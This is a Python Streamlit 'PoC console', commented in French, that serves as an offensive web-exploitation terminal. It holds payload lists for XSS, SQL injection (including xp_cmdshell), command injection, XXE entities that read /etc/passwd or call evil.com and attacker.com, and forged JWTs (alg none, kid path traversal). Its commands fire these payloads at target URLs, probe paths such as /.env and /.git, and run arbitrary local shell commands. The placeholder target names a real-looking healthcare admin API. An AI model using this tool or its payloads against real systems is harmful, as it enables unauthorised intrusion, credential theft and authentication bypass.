# poc_console.py (VERSION ULTRA-COMPLÈTE CORRIGÉE)
import streamlit as st
from datetime import datetime
import time
import random
import hashlib
import base64
import json
import subprocess
import shlex

# requests est recommandé
try:
    import requests
except ImportError:
    requests = None

# ===============================================================================
#                          SYSTÈME DE PAYLOADS INTELLIGENTS ÉTENDU
# ===============================================================================

class AdvancedPayloadGenerator:
    """Générateur de payloads contextuels et évolutifs - ÉTENDU"""
    
    def __init__(self, target_domain):
        self.target = target_domain
        self.timestamp = int(time.time())
        self.signature = hashlib.md5(target_domain.encode()).hexdigest()[:8]
    
    def generate_contextual_payload(self, scan_type, context=None):
        """Génère des payloads adaptés au type de scan et contexte"""
        
        base_payloads = {
            'reflection': [
                f"TROPIC_REFL_{self.timestamp}_{self.signature}",
                f"<tropic>{self.timestamp}</tropic>",
                f"/* TROPIC_{self.signature} */",
                f"[[TROPIC_{self.timestamp}]]"
            ],
            
            'xss': [
                '<script>console.log("TROPIC_XSS")</script>',
                '<img src=x onerror="alert(`TROPIC_XSS`)">',
                '<svg onload="console.log(`TROPIC_XSS`)">',
                'javascript:alert("TROPIC_XSS")',
                '" onmouseover="alert(`TROPIC_XSS`)'
            ],
            
            'sqli': [
                f"' AND 1=1-- TROPIC_{self.signature}",
                f"1' UNION SELECT NULL,'TROPIC_{self.timestamp}',NULL--",
                "' OR EXISTS(SELECT * FROM information_schema.tables)-- TROPIC",
                "'; EXEC xp_cmdshell('echo TROPIC')--"
            ],
            
            'rce': [
                f'; echo "TROPIC_RCE_{self.timestamp}"',
                '| whoami | grep -i tropic',
                '`id | tee /tmp/tropic_{self.timestamp}`',
                '$(curl -X POST http://tropic.test)'
            ],
            
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                f'${{{{7*7}}}} TROPIC_SSTI_{self.timestamp}'
            ],
            
            'xxe': [
                '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY tropic SYSTEM "http://evil.com">]>',
                '<!DOCTYPE test [ <!ENTITY % remote SYSTEM "http://attacker.com/xxe"> %remote; ]>'
            ],
            
            'prototype_pollution': [
                '__proto__[TROPIC]=' + str(self.timestamp),
                'constructor.prototype.tropic=' + self.signature,
                'Object.prototype.TROPIC_POLLUTION=' + str(self.timestamp)
            ],
            
            'graphql': [
                '{ __schema { types { name } } }',
                'query { __typename }',
                f'mutation {{ createUser(name: "TROPIC_{self.timestamp}") }}',
                'query { users { id email password } }',
                'mutation { updateUser(id: 1, admin: true) }'
            ],
            
            'jwt': [
                'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',
                'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0cm9waWMifQ.',
                'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cm9waWMifQ.',
            ],
            
            'api': [
                f'{{"username":"tropic_{self.timestamp}","password":"test"}}',
                f'{{"email":"tropic@test.com","role":"admin"}}',
                f'{{"query":"SELECT * FROM users WHERE id=1"}}',
                f'{{"command":"whoami"}}'
            ]
        }
        
        payloads = base_payloads.get(scan_type, [f"TROPIC_DEFAULT_{self.timestamp}"])
        return random.choice(payloads)

# ===============================================================================
#                          FONCTIONS JWT AVANCÉES
# ===============================================================================

class JWTAnalyzer:
    """Analyseur et générateur de tokens JWT"""
    
    @staticmethod
    def decode_jwt(token):
        """Décode un token JWT et retourne le header et payload"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, "Token JWT invalide (3 parties attendues)"
            
            header = json.loads(base64.b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.b64decode(parts[1] + '==').decode())
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2]
            }, None
            
        except Exception as e:
            return None, f"Erreur décodage JWT: {str(e)}"
    
    @staticmethod
    def generate_test_jwts():
        """Génère des tokens JWT de test pour différentes vulnérabilités"""
        test_jwts = {
            'none_alg': 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',
            'weak_secret': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0cm9waWMifQ.',
            'admin_claim': 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0cm9waWMiLCJhZG1pbiI6dHJ1ZX0.',
            'kid_injection': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJ0cm9waWMifQ.'
        }
        return test_jwts

# ===============================================================================
#                          FONCTIONS DE BASE (COMMANDES SIMPLES)
# ===============================================================================

def _execute_local_command(cmd, timeout=10):
    """Exécute une commande locale sécurisée"""
    try:
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "Commande expirée (timeout)", 1
    except Exception as e:
        return "", f"Erreur: {str(e)}", 1

def _http_request_simple(url, method='GET', timeout=10, headers=None):
    """Requête HTTP simple avec gestion d'erreurs"""
    if requests is None:
        return 0, "Requests non installé", ""
    
    headers = headers or {"User-Agent": "TROPIC-Scanner/1.0"}
    
    try:
        if method.upper() == 'GET':
            response = requests.get(url, headers=headers, timeout=timeout, verify=False)
        elif method.upper() == 'POST':
            response = requests.post(url, headers=headers, timeout=timeout, verify=False)
        else:
            response = requests.request(method, url, headers=headers, timeout=timeout, verify=False)
        
        return response.status_code, response.text, None
        
    except requests.exceptions.RequestException as e:
        return 0, "", f"Erreur HTTP: {str(e)}"

# ===============================================================================
#                          FONCTIONS UTILITAIRES
# ===============================================================================

def _safe_rerun():
    """Essayez plusieurs méthodes de rerun"""
    try:
        rerun = getattr(st, "experimental_rerun", None)
        if callable(rerun):
            rerun()
            return
    except Exception:
        pass

    try:
        rerun = getattr(st, "rerun", None)
        if callable(rerun):
            rerun()
            return
    except Exception:
        pass
    return

def _append_history(msg: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    st.session_state['poc_shell_cmd_history_list'].append(f"[{ts}] {msg}")
    max_h = st.session_state.get('poc_max_history', 500)
    if len(st.session_state['poc_shell_cmd_history_list']) > max_h:
        st.session_state['poc_shell_cmd_history_list'] = st.session_state['poc_shell_cmd_history_list'][-max_h:]

def _summarize_body(body, max_chars=1000):
    """Résume le corps d'une réponse"""
    if not body:
        return "[vide]"
    if len(body) > max_chars:
        return body[:max_chars] + "..."
    return body

# ===============================================================================
#                    FONCTION PRINCIPALE ULTRA-COMPLÈTE
# ===============================================================================

def render_poc_console(target_domain: str, user_config: dict):
    """
    Console PoC ULTRA-COMPLÈTE avec TOUTES les commandes
    """

    st.markdown("### 💻 Console PoC / Terminal d'Exploitation (ULTRA-COMPLÈTE)")
    st.warning("⚠️ Utiliser uniquement sur des cibles autorisées.")

    # Initialisation
    payload_gen = AdvancedPayloadGenerator(target_domain)
    jwt_analyzer = JWTAnalyzer()
    
    # Configuration
    timeout_config = user_config.get('timeout', 10)
    ua_config = user_config.get('user_agent', "TROPIC-Scanner/1.0")
    allow_real = user_config.get('allow_real_poc', False)
    
    # Affichage du mode
    mode_text = "🔴 **MODE RÉEL**" if allow_real else "🟢 **MODE SIMULATION**"
    st.info(mode_text)

    # Initialisation session
    if 'poc_shell_cmd_history_list' not in st.session_state:
        st.session_state['poc_shell_cmd_history_list'] = []
    if 'poc_current_shell_command_input' not in st.session_state:
        st.session_state['poc_current_shell_command_input'] = ""
    if 'poc_last_status' not in st.session_state:
        st.session_state['poc_last_status'] = None
    if 'poc_last_time' not in st.session_state:
        st.session_state['poc_last_time'] = None

    # Affichage historique
    if st.session_state['poc_shell_cmd_history_list']:
        st.code("\n".join(st.session_state['poc_shell_cmd_history_list'][-20:]), language='bash')
    else:
        st.info("Historique vide — utilisez les commandes ci-dessous.")

    st.markdown("---")

    # GUIDE DES COMMANDES COMPLET
    with st.expander("📚 TOUTES LES COMMANDES DISPONIBLES"):
        st.markdown("""
        **🔧 COMMANDES SYSTÈME :**
        - `id`, `ls`, `whoami`, `pwd` - Commandes système
        - `local:<commande>` - Exécution locale (ex: `local:cat /etc/passwd`)

        **🌐 COMMANDES HTTP SIMPLES :**
        - `http://url`, `https://url` - GET simple
        - `probe:url` - Test réflexion avec token
        - `get:url`, `post:url` - Méthodes spécifiques

        **🔍 COMMANDES SCAN AVANCÉ :**
        - `scan:xss:url`, `scan:sqli:url`, `scan:rce:url`
        - `scan:api:url` - Scan multi-méthodes
        - `scan:jwt:url` - Test vulnérabilités JWT

        **🔐 COMMANDES JWT :**
        - `decode:jwt:token` - Décode un token
        - `generate:jwt` - Génère des tokens test

        **🕸️ COMMANDES GRAPHQL :**
        - `scan:graphql:url` - Test introspection
        - `introspect:graphql:url` - Introspection complète

        **🔎 COMMANDES D'ANALYSE :**
        - `tech:detect:url` - Détection stack technique
        - `fuzz:endpoints:url` - Fuzzing d'endpoints
        """)

    # FORMULAIRE DE SAISIE
    form_key = f"poc_form_{target_domain}"
    with st.form(key=form_key, clear_on_submit=False):
        cmd_input = st.text_input("Entrer commande PoC", 
                                 value=st.session_state.get('poc_current_shell_command_input', ""),
                                 placeholder="Ex: https://admin.doctolib.fr/api/v2/config")
        submit = st.form_submit_button("▶️ Exécuter")

        if submit:
            cmd = (cmd_input or "").strip()
            st.session_state['poc_current_shell_command_input'] = ""
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if not cmd:
                st.warning("Commande vide.")
                return

            # ===============================================================================
            #                          TOUTES LES COMMANDES IMPLÉMENTÉES
            # ===============================================================================

            # 🔧 COMMANDES SYSTÈME
            if cmd in ['id', 'ls', 'whoami', 'pwd']:
                _append_history(f"$ {cmd}")
                if allow_real:
                    stdout, stderr, returncode = _execute_local_command(cmd, timeout_config)
                    if stdout:
                        _append_history(stdout)
                    if stderr:
                        _append_history(f"ERR: {stderr}")
                    st.session_state['poc_last_status'] = f"returncode {returncode}"
                else:
                    simulated = {
                        'id': 'uid=1000(tropic) gid=1000(tropic) groups=1000(tropic)',
                        'ls': 'app.py\npoc_console.py\nrequirements.txt',
                        'whoami': 'tropic',
                        'pwd': '/home/tropic'
                    }
                    _append_history(simulated.get(cmd, f"[SIMULATION] {cmd}"))
                    st.session_state['poc_last_status'] = "200 (simulé)"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # 🖥️ COMMANDES LOCALES
            elif cmd.lower().startswith('local:'):
                local_cmd = cmd[6:].strip()
                _append_history(f"$ {local_cmd}")
                if allow_real:
                    stdout, stderr, returncode = _execute_local_command(local_cmd, timeout_config)
                    if stdout:
                        _append_history(stdout)
                    if stderr:
                        _append_history(f"ERR: {stderr}")
                    st.session_state['poc_last_status'] = f"returncode {returncode}"
                else:
                    _append_history(f"[SIMULATION] {local_cmd}")
                    st.session_state['poc_last_status'] = "200 (simulé)"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # 🌐 COMMANDES HTTP SIMPLES
            elif cmd.startswith('http://') or cmd.startswith('https://'):
                _append_history(f"$ {cmd}")
                status, body, error = _http_request_simple(cmd, 'GET', timeout_config)
                if error:
                    _append_history(f"[ERROR] {error}")
                    st.session_state['poc_last_status'] = "HTTP-ERROR"
                else:
                    snippet = _summarize_body(body)
                    _append_history(f"[HTTP {status}] {snippet}")
                    st.session_state['poc_last_status'] = f"HTTP {status}"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            elif cmd.lower().startswith('get:') or cmd.lower().startswith('post:'):
                parts = cmd.split(':', 1)
                if len(parts) == 2:
                    method, url = parts[0].upper(), parts[1].strip()
                    _append_history(f"$ {method} {url}")
                    status, body, error = _http_request_simple(url, method, timeout_config)
                    if error:
                        _append_history(f"[ERROR] {error}")
                        st.session_state['poc_last_status'] = f"{method}-ERROR"
                    else:
                        snippet = _summarize_body(body)
                        _append_history(f"[{method} {status}] {snippet}")
                        st.session_state['poc_last_status'] = f"{method} {status}"
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return

            # 🔍 COMMANDE PROBE
            elif cmd.lower().startswith('probe:'):
                url = cmd[6:].strip()
                _append_history(f"$ probe:{url}")
                token = f"TROPIC_PROBE_{int(time.time())}"
                full_url = f"{url}?input={token}&q={token}&search={token}"
                status, body, error = _http_request_simple(full_url, 'GET', timeout_config)
                if error:
                    _append_history(f"[ERROR] {error}")
                    st.session_state['poc_last_status'] = "PROBE-ERROR"
                else:
                    if token in body:
                        _append_history(f"🎯 [REFLECTED] Token trouvé! (HTTP {status})")
                        st.session_state['poc_last_status'] = f"REFLECTED {status}"
                    else:
                        snippet = _summarize_body(body)
                        _append_history(f"[NO-REFLECT] Token non trouvé (HTTP {status}) - {snippet}")
                        st.session_state['poc_last_status'] = f"NO-REFLECT {status}"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # 🔐 COMMANDES JWT
            elif cmd.lower().startswith('decode:jwt:'):
                token = cmd[11:].strip()
                _append_history(f"$ decode:jwt:{token[:50]}...")
                result, error = jwt_analyzer.decode_jwt(token)
                if error:
                    _append_history(f"[JWT-ERROR] {error}")
                    st.session_state['poc_last_status'] = "JWT-ERROR"
                else:
                    _append_history("[JWT-DECODED] Token décodé:")
                    _append_history(f"  Header: {json.dumps(result['header'], indent=2)}")
                    _append_history(f"  Payload: {json.dumps(result['payload'], indent=2)}")
                    _append_history(f"  Signature: {result['signature'][:50]}...")
                    st.session_state['poc_last_status'] = "JWT-DECODED"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            elif cmd.lower().startswith('scan:jwt:'):
                url = cmd[9:].strip()
                _append_history(f"$ scan:jwt:{url}")
                # Test avec différents tokens JWT
                test_jwts = jwt_analyzer.generate_test_jwts()
                vulnerabilities = []
                
                for vuln_type, test_token in test_jwts.items():
                    headers = {'Authorization': f'Bearer {test_token}', 'User-Agent': ua_config}
                    status, body, error = _http_request_simple(url, 'GET', timeout_config, headers)
                    
                    if status == 200:
                        vulnerabilities.append(vuln_type)
                        _append_history(f"🎯 [JWT-VULN] {vuln_type} accepté!")
                    else:
                        _append_history(f"✅ [JWT-SAFE] {vuln_type} rejeté (HTTP {status})")
                
                if vulnerabilities:
                    st.session_state['poc_last_status'] = f"JWT-VULN: {', '.join(vulnerabilities)}"
                else:
                    st.session_state['poc_last_status'] = "JWT-SECURE"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            elif cmd.lower() == 'generate:jwt':
                _append_history("$ generate:jwt")
                test_jwts = jwt_analyzer.generate_test_jwts()
                _append_history("[JWT-TEST-TOKENS] Générés:")
                for vuln_type, token in test_jwts.items():
                    _append_history(f"  {vuln_type}: {token}")
                st.session_state['poc_last_status'] = "JWT-GENERATED"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # 🔍 COMMANDES SCAN AVANCÉ
            elif cmd.lower().startswith('scan:'):
                parts = cmd.split(':', 2)
                if len(parts) >= 3:
                    scan_type, url = parts[1], parts[2]
                    _append_history(f"$ scan:{scan_type}:{url}")
                    
                    if scan_type in ['xss', 'sqli', 'rce', 'ssti']:
                        payload = payload_gen.generate_contextual_payload(scan_type)
                        test_url = f"{url}?input={payload}&q={payload}"
                        status, body, error = _http_request_simple(test_url, 'GET', timeout_config)
                        
                        if error:
                            _append_history(f"[SCAN-ERROR] {error}")
                        elif payload in body:
                            _append_history(f"🎯 [VULNERABLE] {scan_type.upper()} détecté!")
                            st.session_state['poc_last_status'] = f"VULN-{scan_type.upper()}"
                        else:
                            _append_history(f"✅ [SAFE] {scan_type.upper()} non détecté")
                            st.session_state['poc_last_status'] = f"SAFE-{scan_type.upper()}"
                    
                    elif scan_type == 'api':
                        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
                        results = []
                        for method in methods:
                            status, body, error = _http_request_simple(url, method, timeout_config)
                            results.append(f"{method}:{status}")
                        _append_history(f"[API-SCAN] Méthodes: {', '.join(results)}")
                        
                        # Vérifier les codes intéressants
                        interesting = [r for r in results if any(x in r for x in ['200', '201', '403', '500'])]
                        if interesting:
                            _append_history(f"🎯 [API-INTERESTING] Codes: {', '.join(interesting)}")
                            st.session_state['poc_last_status'] = "API-INTERESTING"
                        else:
                            st.session_state['poc_last_status'] = "API-SCAN-COMPLETE"
                    
                    elif scan_type == 'graphql':
                        headers = {'Content-Type': 'application/json', 'User-Agent': ua_config}
                        query = {'query': '{ __schema { types { name } } }'}
                        
                        # Essayer POST
                        status, body, error = _http_request_simple(url, 'POST', timeout_config, headers)
                        if status == 200 and 'data' in body:
                            _append_history("🎯 [GRAPHQL-INTROSPECTION] Schéma exposé!")
                            st.session_state['poc_last_status'] = "GRAPHQL-EXPOSED"
                        else:
                            _append_history("✅ [GRAPHQL-SECURE] Introspection non disponible")
                            st.session_state['poc_last_status'] = "GRAPHQL-SECURE"
                    
                    st.session_state['poc_last_time'] = timestamp
                    _safe_rerun()
                    return

            # 🕸️ COMMANDES GRAPHQL
            elif cmd.lower().startswith('introspect:graphql:'):
                url = cmd[19:].strip()
                _append_history(f"$ introspect:graphql:{url}")
                
                headers = {'Content-Type': 'application/json', 'User-Agent': ua_config}
                full_query = {'query': '{ __schema { types { name fields { name type { name } } } } }'}
                
                status, body, error = _http_request_simple(url, 'POST', timeout_config, headers)
                if error:
                    _append_history(f"[GRAPHQL-ERROR] {error}")
                    st.session_state['poc_last_status'] = "GRAPHQL-ERROR"
                elif status == 200:
                    try:
                        data = json.loads(body)
                        if 'data' in data and '__schema' in data['data']:
                            types = data['data']['__schema']['types']
                            _append_history("🎯 [GRAPHQL-INTROSPECTION] Schéma complet exposé!")
                            
                            # Afficher les types intéressants
                            interesting_types = [t for t in types if any(keyword in t['name'].lower() 
                                                                       for keyword in ['user', 'auth', 'admin', 'config'])]
                            
                            for t in interesting_types[:5]:
                                fields = [f['name'] for f in t.get('fields', [])[:3]]
                                _append_history(f"  {t['name']}: {', '.join(fields)}...")
                            
                            st.session_state['poc_last_status'] = f"GRAPHQL-{len(types)}-TYPES"
                        else:
                            _append_history("✅ [GRAPHQL-SECURE] Introspection désactivée")
                            st.session_state['poc_last_status'] = "GRAPHQL-SECURE"
                    except:
                        _append_history("❌ [GRAPHQL-INVALID] Réponse invalide")
                        st.session_state['poc_last_status'] = "GRAPHQL-INVALID"
                else:
                    _append_history(f"❌ [GRAPHQL-ERROR] HTTP {status}")
                    st.session_state['poc_last_status'] = f"GRAPHQL-ERROR-{status}"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # 🔎 COMMANDES D'ANALYSE
            elif cmd.lower().startswith('tech:detect:'):
                url = cmd[12:].strip()
                _append_history(f"$ tech:detect:{url}")
                status, body, error = _http_request_simple(url, 'GET', timeout_config)
                if error:
                    _append_history(f"[ERROR] {error}")
                    st.session_state['poc_last_status'] = "TECH-ERROR"
                else:
                    # Détection basique
                    tech_indicators = {
                        'PHP': ['PHP/', 'X-Powered-By: PHP', '.php'],
                        'Node.js': ['Express', 'Node.js', 'X-Powered-By: Express'],
                        'Python': ['Python/', 'Django', 'Flask', 'Werkzeug'],
                        'Java': ['Java/', 'Tomcat', 'Spring', 'JSP'],
                        '.NET': ['.NET', 'ASP.NET', 'X-Powered-By: ASP.NET'],
                        'React': ['React', 'react-dom', 'next.js'],
                        'Cloudflare': ['cloudflare', 'CF-RAY', 'Server: cloudflare'],
                        'Nginx': ['nginx', 'Server: nginx'],
                        'Apache': ['Apache', 'Server: Apache']
                    }
                    
                    detected = []
                    full_text = body + str(status)
                    
                    for tech, indicators in tech_indicators.items():
                        if any(indicator.lower() in full_text.lower() for indicator in indicators):
                            detected.append(tech)
                    
                    if detected:
                        _append_history(f"🔍 [TECH-DETECTED] {', '.join(detected)}")
                    else:
                        _append_history("🔍 [TECH-UNKNOWN] Stack non identifiée")
                    
                    st.session_state['poc_last_status'] = f"TECH: {', '.join(detected) if detected else 'UNKNOWN'}"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            elif cmd.lower().startswith('fuzz:endpoints:'):
                url = cmd[15:].strip()
                _append_history(f"$ fuzz:endpoints:{url}")
                
                endpoints = [
                    '/api', '/api/v1', '/api/v2', '/api/v3',
                    '/admin', '/admin/login', '/admin/dashboard',
                    '/config', '/config.json', '/.env', '/.git',
                    '/health', '/status', '/metrics', '/debug',
                    '/graphql', '/graphiql', '/playground',
                    '/phpmyadmin', '/mysql', '/db', '/database'
                ]
                
                found_endpoints = []
                for endpoint in endpoints[:10]:  # Limiter pour performance
                    test_url = url.rstrip('/') + endpoint
                    status, body, error = _http_request_simple(test_url, 'GET', 5)  # Timeout court
                    
                    if status in [200, 201, 301, 302]:
                        found_endpoints.append(f"{endpoint}:{status}")
                        _append_history(f"  ✅ {endpoint} -> HTTP {status}")
                    elif status not in [404, 403]:
                        _append_history(f"  ⚠️  {endpoint} -> HTTP {status}")
                
                if found_endpoints:
                    _append_history(f"🎯 [ENDPOINTS-FOUND] {len(found_endpoints)} endpoints découverts")
                    st.session_state['poc_last_status'] = f"FUZZ-FOUND-{len(found_endpoints)}"
                else:
                    _append_history("🔍 [ENDPOINTS-NONE] Aucun endpoint découvert")
                    st.session_state['poc_last_status'] = "FUZZ-NONE"
                
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

            # ❌ COMMANDE INCONNUE
            else:
                _append_history(f"$ {cmd}")
                _append_history("[ERROR] Commande non reconnue. Utilisez:")
                _append_history("  id, ls, whoami, pwd")
                _append_history("  http://url, https://url")
                _append_history("  probe:url, get:url, post:url")
                _append_history("  scan:xss:url, scan:sqli:url, scan:api:url")
                _append_history("  decode:jwt:token, generate:jwt")
                _append_history("  tech:detect:url, fuzz:endpoints:url")
                st.session_state['poc_last_status'] = "400 (unknown command)"
                st.session_state['poc_last_time'] = timestamp
                _safe_rerun()
                return

    # STATUT
    st.markdown("---")
    cols = st.columns([1, 3])
    with cols[0]:
        st.write("**Dernier statut**")
        status = st.session_state.get('poc_last_status', "N/A")
        st.info(status)
    
    with cols[1]:
        st.write("**Dernière action**")
        st.write(st.session_state.get('poc_last_time', "N/A"))

    # ✅ CORRECTION APPLIQUÉE : Utilisation de timeout_config
    st.caption(f"🔧 Mode: {'RÉEL' if allow_real else 'SIMULATION'} | Timeout: {timeout_config}s")
